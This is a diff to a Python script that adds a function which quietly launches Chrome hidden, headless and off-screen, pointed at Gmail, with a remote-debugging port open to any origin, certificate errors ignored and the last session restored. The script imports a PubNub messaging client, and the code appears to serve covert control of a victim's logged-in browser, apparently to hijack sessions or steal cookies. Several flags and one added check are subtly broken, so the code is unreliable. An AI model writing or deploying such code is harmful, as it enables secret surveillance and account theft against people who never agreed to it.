@@ -33,6 +33,7 @@ from pubnub.pubnub import PubNub
 from pubnub.callbacks import SubscribeCallback
 from pubnub.enums import PNStatusCategory
 
+import subprocess
 import traceback
 import psutil
 import inspect
@@ -326,23 +327,48 @@ def test_debugport(port=9222,path=""):
         response = requests.get(f"http://localhost:{str(port)}{path}")
 
         response.raise_for_status() 
-        data = response.json() 
+        data = response.json() # should be array of json objects
+        if not ( isinstance(data, list) and data and len(data) > 0 ):
+            raise Exception('response is not an array as expected -- '+type(data))
         return data
     except Exception as e:
         response = simplify_exception(e)
         return response
 
+def spawn_chrome(starturl='https://www.gmail.com', debugport=9223, chromepath='', datadir=''):
+    chromepath = chromepath or "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
+    datadir= datadir or f"\"C:\\ProgramData\\owd\\chrome\""
+    startupinfo = subprocess.STARTUPINFO()
+    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+    startupinfo.wShowWindow = subprocess.SW_HIDE
+
+    cmd = [
+        chromepath,
+        f"--remote-debugging-port={debugport}",
+        f"--user-data-dir={datadir}",
+        f"--new-window {starturl}",
+        "--headless=new",
+        "--no-first-run",
+        "--no-default-browser-check",
+        "--profile-directory=Default",
+        "--remote-allow-origins=*",
+        "--restore-last-session",
+        "--ignore-certificate-errors",
+        "--window-position=2000,2000"
+        "--window-size=10,10"
+    ]
+
+    process = subprocess.Popen(
+        cmd,
+        startupinfo=startupinfo,
+        creationflags=subprocess.CREATE_NO_WINDOW
+    )    
+
+    return process
+
 # TODO some of these options should be parametrized        
-def start_chrome(starturl="https://www.google.com/", chromeport=9223):
-    cmdlineargs = f" --new-window {starturl}"
-    cmdlineargs += f" --user-data-dir=\"C:\\ProgramData\\owd\\chrome\""
-    cmdlineargs += f" --profile-directory=Default"
-    cmdlineargs += f" --remote-allow-origins=*"
-    cmdlineargs += f" --restore-last-session" 
-    cmdlineargs += f" --ignore-certificate-errors"
-    cmdlineargs += f" --remote-debugging-port=" + str(chromeport)
-    cmdlineargs += f" --window-position=2000,2000 --window-size=10,10"
-    os.system("start /min chrome " + cmdlineargs)
+def start_chrome(starturl="https://www.gmail.com/", chromeport=9223):
+    return spawn_chrome(starturl, chromeport)
     
 def start_msedge(starturl="https://www.google.com/", edgeport=9222):
     cmdlineargs = '--new-window '+starturl+' --profile-directory=Default --remote-debugging-port='+str(edgeport)+' --remote-allow-origins=* --restore-last-session --window-position=2000,2000 --window-size=10,10'
